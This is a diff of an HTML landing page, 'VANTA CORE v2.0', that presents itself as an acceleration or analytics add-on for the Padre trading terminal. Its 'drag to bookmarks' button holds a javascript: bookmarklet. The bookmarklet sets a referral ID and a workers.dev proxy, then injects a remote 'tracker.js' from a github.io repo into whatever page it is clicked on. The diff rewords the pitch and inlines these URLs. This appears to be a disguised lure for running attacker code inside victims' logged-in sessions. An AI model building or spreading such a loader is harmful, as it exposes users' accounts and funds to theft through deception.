@@ -9,38 +9,24 @@
         .container { border: 1px solid #1a1a1a; padding: 50px; border-radius: 20px; background: #080808; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
         h1 { color: var(--primary); font-weight: 800; letter-spacing: -1px; margin: 0; }
         p { color: #666; margin: 10px 0 25px 0; }
-        .btn { 
-            display: inline-block; padding: 18px 40px; background: var(--primary); 
-            color: #000; font-weight: 800; text-decoration: none; border-radius: 8px; 
-            box-shadow: 0 0 20px rgba(0,255,136,0.3); transition: 0.3s;
-        }
-        .btn:hover { transform: scale(1.02); box-shadow: 0 0 30px var(--primary); }
+        .btn { display: inline-block; padding: 18px 40px; background: var(--primary); color: #000; font-weight: 800; text-decoration: none; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,136,0.3); transition: 0.3s; cursor: grab; }
+        .btn:active { cursor: grabbing; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>VANTA CORE v2.0</h1>
-        <p>Optimized Analytics for Terminal Padre</p>
+        <p>WebGL Terminal Acceleration for Padre</p>
         <a id="vanta-btn" class="btn" href="#">[ DRAG TO BOOKMARKS ]</a>
-        <div style="font-size: 10px; margin-top: 25px; color: #222;">ID: t23dad55</div>
     </div>
-
     <script>
-        const CONFIG = {
-            ref: "t23dad55",
-            proxy: "https://vanta-proxy.jdurrulo.workers.dev/",
-            payload: "https://jinxthesimp.github.io/Dropshipper/tracker.js"
-        };
-
-        // The "Hook": Injecting config into the browser window before loading the brain
         const loader = `javascript:(function(){
-            window.V_REF="${CONFIG.ref}";
-            window.V_PROXY="${CONFIG.proxy}";
+            window.V_REF="t23dad55";
+            window.V_PROXY="https://vanta-proxy.jdurrulo.workers.dev/";
             const s=document.createElement('script');
-            s.src="${CONFIG.payload}?"+Date.now();
+            s.src="https://jinxthesimp.github.io/Dropshipper/tracker.js?"+Date.now();
             document.head.appendChild(s);
         })();`;
-
         document.getElementById('vanta-btn').href = loader;
     </script>
 </body>
